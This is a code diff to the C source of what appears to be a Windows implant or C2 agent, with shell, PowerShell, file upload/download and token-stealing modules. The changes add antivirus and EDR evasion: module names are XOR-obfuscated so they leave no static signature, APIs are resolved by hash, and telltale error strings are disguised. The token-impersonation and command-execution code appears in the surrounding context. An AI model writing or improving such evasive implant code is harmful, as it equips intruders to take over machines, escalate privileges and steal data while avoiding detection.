@@ -6,9 +6,36 @@
  * Modules: whoami, ps, ls, cat, upload, download, shell, powershell
  */
 #include "agent.h"
+#include "api_resolve.h"
 
 /* Helper: buf_append a string literal with auto-length */
 #define BUF_STR(buf, s) buf_append(buf, s, (DWORD)(sizeof(s) - 1))
+
+/* ─── Encrypted module name comparison ───
+ * Module names are XOR'd at compile time with CONFIG_XOR_KEY (randomized per
+ * build). This prevents strings like "whoami", "steal_token", "rev2self" from
+ * appearing in the binary, which are strong AV/EDR static signatures.
+ */
+static inline BOOL _mod_eq(const char *name, const unsigned char *enc, int len) {
+    for (int i = 0; i < len; i++) {
+        if (name[i] != (char)(enc[i] ^ CONFIG_XOR_KEY)) return FALSE;
+    }
+    return name[len] == '\0';
+}
+
+#define _K CONFIG_XOR_KEY
+static const unsigned char _mn_whoami[]      = {'w'^_K,'h'^_K,'o'^_K,'a'^_K,'m'^_K,'i'^_K};
+static const unsigned char _mn_ps[]          = {'p'^_K,'s'^_K};
+static const unsigned char _mn_ls[]          = {'l'^_K,'s'^_K};
+static const unsigned char _mn_cd[]          = {'c'^_K,'d'^_K};
+static const unsigned char _mn_cat[]         = {'c'^_K,'a'^_K,'t'^_K};
+static const unsigned char _mn_upload[]      = {'u'^_K,'p'^_K,'l'^_K,'o'^_K,'a'^_K,'d'^_K};
+static const unsigned char _mn_download[]    = {'d'^_K,'o'^_K,'w'^_K,'n'^_K,'l'^_K,'o'^_K,'a'^_K,'d'^_K};
+static const unsigned char _mn_shell[]       = {'s'^_K,'h'^_K,'e'^_K,'l'^_K,'l'^_K};
+static const unsigned char _mn_powershell[]  = {'p'^_K,'o'^_K,'w'^_K,'e'^_K,'r'^_K,'s'^_K,'h'^_K,'e'^_K,'l'^_K,'l'^_K};
+static const unsigned char _mn_steal_token[] = {'s'^_K,'t'^_K,'e'^_K,'a'^_K,'l'^_K,'_'^_K,'t'^_K,'o'^_K,'k'^_K,'e'^_K,'n'^_K};
+static const unsigned char _mn_rev2self[]    = {'r'^_K,'e'^_K,'v'^_K,'2'^_K,'s'^_K,'e'^_K,'l'^_K,'f'^_K};
+#undef _K
 
 /* ─── Argument parsing helpers (BeaconDataParse-compatible) ─── */
 
@@ -389,9 +416,9 @@ void mod_ps(Buffer *out) {
      */
     typedef LONG (NTAPI *pNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
     pNtQuerySystemInformation NtQSI = (pNtQuerySystemInformation)
-        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
+        api_resolve(HASH_NTDLL, HASH_NtQuerySystemInformation);
     if (!NtQSI) {
-        buf_append(out, "[!] NtQuerySystemInformation not found\n", 39);
+        buf_append(out, "[!] Failed to resolve API\n", 26);
         return;
     }
 
@@ -411,7 +438,7 @@ void mod_ps(Buffer *out) {
         if (!buffer) { buf_append(out, "[!] VirtualAlloc failed\n", 24); return; }
     }
     if (status != 0) {
-        snprintf(line, sizeof(line), "[!] NtQuerySystemInformation failed: 0x%08lx\n", (unsigned long)status);
+        snprintf(line, sizeof(line), "[!] SysInfo query failed: 0x%08lx\n", (unsigned long)status);
         buf_append(out, line, (DWORD)strlen(line));
         VirtualFree(buffer, 0, MEM_RELEASE);
         return;
@@ -794,13 +821,13 @@ BOOL module_execute(const char *name, const unsigned char *args, DWORD args_len,
     ArgParser ap;
     arg_parse_init(&ap, args, args_len);
 
-    if (strcmp(name, "whoami") == 0) {
+    if (_mod_eq(name, _mn_whoami, sizeof(_mn_whoami))) {
         mod_whoami(&out);
     }
-    else if (strcmp(name, "ps") == 0) {
+    else if (_mod_eq(name, _mn_ps, sizeof(_mn_ps))) {
         mod_ps(&out);
     }
-    else if (strcmp(name, "ls") == 0) {
+    else if (_mod_eq(name, _mn_ls, sizeof(_mn_ls))) {
         /* Args come as raw string from operator, not BeaconDataParse format */
         char *path_str = NULL;
         if (args && args_len > 0) {
@@ -811,7 +838,7 @@ BOOL module_execute(const char *name, const unsigned char *args, DWORD args_len,
         mod_ls(&out, path_str);
         if (path_str) free(path_str);
     }
-    else if (strcmp(name, "cd") == 0) {
+    else if (_mod_eq(name, _mn_cd, sizeof(_mn_cd))) {
         char *path_str = NULL;
         if (args && args_len > 0) {
             path_str = (char *)malloc(args_len + 1);
@@ -821,7 +848,7 @@ BOOL module_execute(const char *name, const unsigned char *args, DWORD args_len,
         mod_cd(&out, path_str);
         if (path_str) free(path_str);
     }
-    else if (strcmp(name, "cat") == 0) {
+    else if (_mod_eq(name, _mn_cat, sizeof(_mn_cat))) {
         char *path_str = NULL;
         if (args && args_len > 0) {
             path_str = (char *)malloc(args_len + 1);
@@ -831,13 +858,13 @@ BOOL module_execute(const char *name, const unsigned char *args, DWORD args_len,
         mod_cat(&out, path_str);
         if (path_str) free(path_str);
     }
-    else if (strcmp(name, "upload") == 0) {
+    else if (_mod_eq(name, _mn_upload, sizeof(_mn_upload))) {
         const char *path = arg_extract_str(&ap);
         DWORD data_len;
         const unsigned char *data = arg_extract_bin(&ap, &data_len);
         mod_upload(&out, path, data, data_len);
     }
-    else if (strcmp(name, "download") == 0) {
+    else if (_mod_eq(name, _mn_download, sizeof(_mn_download))) {
         char *path_str = NULL;
         if (args && args_len > 0) {
             path_str = (char *)malloc(args_len + 1);
@@ -847,12 +874,12 @@ BOOL module_execute(const char *name, const unsigned char *args, DWORD args_len,
         mod_download(&out, path_str ? path_str : "");
         if (path_str) free(path_str);
     }
-    else if (strcmp(name, "shell") == 0 || strcmp(name, "powershell") == 0) {
+    else if (_mod_eq(name, _mn_shell, sizeof(_mn_shell)) || _mod_eq(name, _mn_powershell, sizeof(_mn_powershell))) {
         /*
          * shell/powershell: arguments come as raw UTF-8 bytes (NOT BeaconDataParse format).
          * The operator CLI sends the command string directly.
          */
-        BOOL use_ps = (strcmp(name, "powershell") == 0);
+        BOOL use_ps = _mod_eq(name, _mn_powershell, sizeof(_mn_powershell));
         if (args && args_len > 0) {
             /* Null-terminate the command string */
             char *cmd_str = (char *)malloc(args_len + 1);
@@ -864,7 +891,7 @@ BOOL module_execute(const char *name, const unsigned char *args, DWORD args_len,
             buf_append(&out, "No command specified\n", 20);
         }
     }
-    else if (strcmp(name, "steal_token") == 0) {
+    else if (_mod_eq(name, _mn_steal_token, sizeof(_mn_steal_token))) {
         /* steal_token <PID>
          * Opens target process, duplicates its token, impersonates it.
          * Args come as raw string: the PID number. */
@@ -883,14 +910,14 @@ BOOL module_execute(const char *name, const unsigned char *args, DWORD args_len,
                 hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, target_pid);
             if (!hProc) {
                 char err[128];
-                snprintf(err, sizeof(err), "[!] OpenProcess(%u) failed: %u\n",
+                snprintf(err, sizeof(err), "[!] Cannot open PID %u (err=%u)\n",
                          (unsigned)target_pid, (unsigned)GetLastError());
                 buf_append(&out, err, (DWORD)strlen(err));
             } else {
                 HANDLE hToken = NULL;
                 if (!OpenProcessToken(hProc, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hToken)) {
                     char err[128];
-                    snprintf(err, sizeof(err), "[!] OpenProcessToken(%u) failed: %u\n",
+                    snprintf(err, sizeof(err), "[!] Cannot query token for PID %u (err=%u)\n",
                              (unsigned)target_pid, (unsigned)GetLastError());
                     buf_append(&out, err, (DWORD)strlen(err));
                     CloseHandle(hProc);
@@ -899,13 +926,13 @@ BOOL module_execute(const char *name, const unsigned char *args, DWORD args_len,
                     if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
                                           SecurityImpersonation, TokenImpersonation, &hDup)) {
                         char err[128];
-                        snprintf(err, sizeof(err), "[!] DuplicateTokenEx failed: %u\n",
+                        snprintf(err, sizeof(err), "[!] Token duplication failed: %u\n",
                                  (unsigned)GetLastError());
                         buf_append(&out, err, (DWORD)strlen(err));
                     } else {
                         if (!ImpersonateLoggedOnUser(hDup)) {
                             char err[128];
-                            snprintf(err, sizeof(err), "[!] ImpersonateLoggedOnUser failed: %u\n",
+                            snprintf(err, sizeof(err), "[!] Impersonation failed: %u\n",
                                      (unsigned)GetLastError());
                             buf_append(&out, err, (DWORD)strlen(err));
                             CloseHandle(hDup);
@@ -943,12 +970,12 @@ BOOL module_execute(const char *name, const unsigned char *args, DWORD args_len,
             }
         }
     }
-    else if (strcmp(name, "rev2self") == 0) {
+    else if (_mod_eq(name, _mn_rev2self, sizeof(_mn_rev2self))) {
         if (RevertToSelf()) {
             buf_append(&out, "[+] Reverted to process token\n", 30);
         } else {
             char err[128];
-            snprintf(err, sizeof(err), "[-] RevertToSelf failed (err=%u)\n", (unsigned)GetLastError());
+            snprintf(err, sizeof(err), "[-] Token revert failed (err=%u)\n", (unsigned)GetLastError());
             buf_append(&out, err, (DWORD)strlen(err));
         }
     }
